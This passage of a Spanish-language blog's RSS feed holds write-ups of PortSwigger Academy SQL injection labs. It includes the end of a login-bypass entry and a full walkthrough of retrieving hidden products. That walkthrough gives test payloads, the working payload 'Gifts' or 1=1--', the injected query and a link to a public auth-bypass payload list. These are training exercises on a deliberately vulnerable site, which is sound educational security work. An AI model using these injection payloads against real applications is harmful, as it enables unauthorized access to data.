			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/resuelto_hu1f762c5329538831645bcff2ad905856_58052_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/resuelto_hu1f762c5329538831645bcff2ad905856_58052_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Login Bypass&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Login Bypass&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Tambien hubiera sido posible utilizar una &lt;!-- raw HTML omitted --&gt;lista&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt; para realizar un ataque con intruder pero esta vez no fue necesario ya que el bypass es basico, pero se podria intentar.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass2.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Lista&lt;/a&gt; de payloads bypass login&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 1</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/</link>
        <pubDate>Mon, 01 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 1" /&gt;&lt;h1 id=&#34;lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data&#34;&gt;Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data&lt;/h1&gt;
&lt;p&gt;Este laboratorio contiene una vulnerabilidad de SQL Injection y la manera de resolverlo es que haga un ataque de SQL y que muestra los detalles de todos los productos en cualquier categoria, tanto &lt;code&gt;released&lt;/code&gt; como &lt;code&gt;unreleased&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Nos regalan una pista y se nos dice que el sistema realiza la siguiente consulta SQL&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;products&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;category&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Gifts&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;released&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Como lo explica en la lectura del laboratorio, la aplicacion recupera datos de la categoria &lt;code&gt;Gifts&lt;/code&gt; y que solo se muestre los datos que tengan &lt;code&gt;released&lt;/code&gt; como valor 1.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;He probado los siguientes payloads para saber si podria mostrar el resto de productos que no esta mostrando anteriormente.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Payload&lt;/th&gt;
&lt;th&gt;Accion&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Gifts&#39;&amp;ndash;&lt;/td&gt;
&lt;td&gt;Muestra solo 1 producto mas&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Gifts&#39;&amp;ndash; -&lt;/td&gt;
&lt;td&gt;Muestra solo 1 producto master&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Gifts&#39; and released = 0&amp;ndash;&lt;/td&gt;
&lt;td&gt;Muestra solo 1 producto&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Al notar como hace la validacion nos podemos dar cuenta que podriamos bypassear esa instruccion, recordando a la forma en que se hace un bypass a un login. Creando la siguiente consulta a inyectar quedaria: SQL&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Gifts&#39; or 1=1--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Para que al final al inyectar la consulta SQL quedaria: SQL&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;products&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;category&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Gifts&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- AND released = 1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Haciendo que despues de &lt;code&gt;--&lt;/code&gt; se comente lo que le sigue y solo se ejecute lo primero. Adicionalmente no existe solo ese payload, se puede hacer uso de otros como la siguiente &lt;!-- raw HTML omitted --&gt;lista&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;Y por el tamano de la salida nos podemos dar cuenta que arroja muchos datos, aunque un payload no sea aceptado se puede hacer uso de otros.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 272; 
			flex-basis: 653px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/intruder.png&#34; data-size=&#34;765x281&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/intruder.png&#34;
			width=&#34;765&#34;
			height=&#34;281&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/intruder_hu2ccd66ec86f3df3c4bd2dbac1bdd383f_13343_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/intruder_hu2ccd66ec86f3df3c4bd2dbac1bdd383f_13343_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque con intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque con intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass2.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Lista&lt;/a&gt; de payloads bypass login&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        
    </channel>
</rss>
